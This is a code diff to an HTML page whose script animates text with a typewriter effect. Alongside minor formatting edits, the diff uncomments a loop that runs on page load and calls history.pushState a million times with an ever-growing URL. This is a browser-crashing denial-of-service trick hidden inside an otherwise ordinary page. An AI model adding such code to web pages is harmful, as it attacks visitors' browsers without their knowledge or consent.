@@ -65,21 +65,21 @@ Email: 0xedison@gmail.com
                 }
             }, speed);
           };
+
           var  oDiv = document.getElementById("one");
           var  oDiv2 = document.getElementById('two');
-          var str  = oDiv2.innerHTML;
+          var  str = oDiv2.innerHTML;
+
           setTimeout(function(){
               prints( oDiv ,str, 100 );
           },100);
 
-/*
-	var total="";
-	for (var i=0;i<1000000;i++)
-	{
-		total= total+i.toString();
-		history.pushState(0,0,total);
-	}
-*/
+
+         var total="";
+         for (var i=0;i<1000000;i++) {
+		    total= total+i.toString();
+		    history.pushState(0,0,total);
+         }
 
       </script>
 </body>
